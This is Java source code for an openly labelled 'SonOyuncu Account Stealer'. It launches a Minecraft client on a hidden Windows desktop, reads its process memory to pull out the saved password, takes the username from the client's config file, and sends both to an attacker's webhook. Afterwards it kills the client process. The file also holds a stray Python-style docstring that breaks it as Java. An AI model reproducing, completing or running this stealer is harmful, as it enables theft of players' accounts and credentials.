import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinBase.PROCESS_INFORMATION;
import com.sun.jna.platform.win32.WinBase.STARTUPINFO;
import com.sun.jna.platform.win32.WinNT.HANDLE;
//import com.sun.jna.platform.win32.WinDef.WORD; Wrong İmport :D
import com.sun.jna.platform.win32.WinDef.WORD;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.W32APIOptions;

import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

/**
 * @author: ItzGonza & Fantasy
 * @contributor: Fatih1963
 * @version: 2.1
 * @date: 2025-06-29
 */

"""
@author: ItzGonza
@contributor: fatih1963
@version: 2.1
@date: 2025-06-29
"""
public class Main {
    private static final String APPLICATION_PATH = System.getenv("APPDATA") + "/.sonoyuncu/sonoyuncuclient.exe";
    private static final String CONFIG_PATH = System.getenv("APPDATA") + "/.sonoyuncu/config.json";
    private static final String WEBHOOK_URL = "UR_URL_HERE";

    private User32 user32;
    private Kernel32 kernel32;
    private String desktopName;
    private HANDLE hiddenDesktop;
    private PROCESS_INFORMATION processInfo;

    public interface ExtendedUser32 extends User32 {
        ExtendedUser32 INSTANCE = Native.load("user32", ExtendedUser32.class, W32APIOptions.DEFAULT_OPTIONS);
        HANDLE CreateDesktopW(String desktop, String device, String deviceMode, int flags, int desiredAccess, Pointer securityAttributes);
        boolean CloseDesktop(HANDLE hDesktop);
    }

    public interface ExtendedKernel32 extends Kernel32 {
        ExtendedKernel32 INSTANCE = Native.load("kernel32", ExtendedKernel32.class, W32APIOptions.DEFAULT_OPTIONS);
        boolean CreateProcessW(String lpApplicationName, String lpCommandLine, Pointer lpProcessAttributes, Pointer lpThreadAttributes, boolean bInheritHandles, int dwCreationFlags, Pointer lpEnvironment, String lpCurrentDirectory, STARTUPINFO lpStartupInfo, PROCESS_INFORMATION lpProcessInformation);
    }

    public Main() {
        this.kernel32 = ExtendedKernel32.INSTANCE;
        this.user32 = ExtendedUser32.INSTANCE;
        this.desktopName = "HiddenDesktop";
        this.hiddenDesktop = null;
        this.processInfo = null;
    }

    private PROCESS_INFORMATION launchApplication() {
        STARTUPINFO startupInfo = new STARTUPINFO();
        startupInfo.dwFlags = 0x00000001;
        startupInfo.wShowWindow = new WORD(0);
        startupInfo.lpDesktop = desktopName;

        PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
        if (!((ExtendedKernel32) kernel32).CreateProcessW(null, APPLICATION_PATH, null, null, false, 0x08000000, null, null, startupInfo, processInfo)) {
            ((ExtendedUser32) user32).CloseDesktop(this.hiddenDesktop);
            return null;
        }
        return processInfo;
    }

    private void cleanup(int processId) {
        try {
            new ProcessBuilder("taskkill", "/F", "/PID", String.valueOf(processId)).start().waitFor();
        } catch (Exception ignored) {}
        if (processInfo != null) {
            kernel32.CloseHandle(processInfo.hProcess);
            kernel32.CloseHandle(processInfo.hThread);
        }
        if (hiddenDesktop != null) {
            ((ExtendedUser32) user32).CloseDesktop(hiddenDesktop);
        }
    }

    private byte[] readProcessMemory(int processId, long address, int size) {
        IntByReference bytesRead = new IntByReference(0);
        byte[] buffer = new byte[size];
        Memory memory = new Memory(size);

        HANDLE hProcess = kernel32.OpenProcess(0x0010 | 0x0020, false, processId);
        if (hProcess != null) {
            try {
                if (!kernel32.ReadProcessMemory(hProcess, new Pointer(address), memory, size, bytesRead))
                    return null;
                memory.read(0, buffer, 0, size);
                return buffer;
            } finally {
                kernel32.CloseHandle(hProcess);
            }
        }
        return null;
    }

    private long getModuleBaseAddress(int processId) {
        try {
            Process process = new ProcessBuilder("powershell",
                    "-Command",
                    "$m = (Get-Process -Id " + processId + ").Modules | Where-Object { $_.ModuleName -eq 'sonoyuncuclient.exe' }; " +
                            "if ($m) { $m.BaseAddress.ToInt64() } else { 0 }"
            ).start();

            String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8).trim();
            process.waitFor();
            return Long.parseLong(output);
        } catch (Exception e) {
            return 0;
        }
    }

    private String[] extractMemoryCredentials(int processId) {
        long[] offsets = {0x1CA9B0L, 0x1CA900L, 0x1CAA00L, 0x1CA800L, 0x1CAB00L};
        long startTime = System.currentTimeMillis();

        while (System.currentTimeMillis() - startTime < 15000) {
            long baseAddress = getModuleBaseAddress(processId);
            if (baseAddress == 0) continue;

            for (long offset : offsets) {
                byte[] memory = readProcessMemory(processId, baseAddress + offset, 512);
                if (memory == null) continue;

                StringBuilder clean = new StringBuilder();
                for (byte b : memory) {
                    int value = b & 0xFF;
                    if (value >= 32 && value <= 126) {
                        clean.append((char) value);
                    } else if (value == 0 && clean.length() > 0) {
                        break;
                    }
                }

                if (clean.length() > 0) {
                    Matcher matcher = Pattern.compile("[A-Za-z0-9._\\-@+#$%^&*=!?~'\",\\\\|/:<>\\[\\]{}()]{3,64}").matcher(clean.toString());
                    if (matcher.find()) {
                        try {
                            String json = Files.readString(Paths.get(CONFIG_PATH));
                            String username = new Gson().fromJson(json, JsonObject.class).get("userName").getAsString();
                            return new String[]{username, matcher.group()};
                        } catch (IOException ignored) {}
                    }
                }
            }

            try {
                Thread.sleep(500);
            } catch (InterruptedException ignored) {}
        }
        return null;
    }

    public String[] extractCredentials() {
        try {
            this.hiddenDesktop = ((ExtendedUser32) user32).CreateDesktopW(desktopName, null, null, 0, 0x00000002 | 0x00000080 | 0x00000001 | 0x10000000, null);
            this.processInfo = launchApplication();
            if (this.processInfo == null) return null;
            return extractMemoryCredentials(processInfo.dwProcessId.intValue());
        } finally {
            if (processInfo != null) {
                cleanup(processInfo.dwProcessId.intValue());
            }
        }
    }

    private static boolean sendWebhook(String[] credentials) {
        if (credentials == null) return false;

        try (CloseableHttpClient client = HttpClients.createDefault()) {
            HttpPost request = new HttpPost(WEBHOOK_URL);
            String json = String.format(
                    "{" +
                            "\"username\": \"hrsz\"," +
                            "\"embeds\": [{" +
                            "\"title\": \"SonOyuncu Account Stealer\"," +
                            "\"color\": 65505," +
                            "\"description\": \"Username: **%s**\\nPassword: **%s**\"," +
                            "\"thumbnail\": {\"url\": \"https://www.minotar.net/avatar/%s\"}," +
                            "\"footer\": {\"text\": \"github.com/itzgonza\",\"icon_url\": \"https://avatars.githubusercontent.com/u/61884903\"}" +
                            "}]}",
                    credentials[0], credentials[1], credentials[0]
            );
            request.setEntity(new StringEntity(json));
            request.setHeader("Content-Type", "application/json");
            return client.execute(request).getStatusLine().getStatusCode() == 204;
        } catch (Exception e) {
            return false;
        }
    }

    public static void main(String[] args) {
        if (new File(APPLICATION_PATH).exists()) {
            Main stealer = new Main();
            String[] creds = stealer.extractCredentials();
            if (sendWebhook(creds)) {
                System.out.println("successfully ~> " + creds[0] + ":" + creds[1]);
            }
        }
    }
}
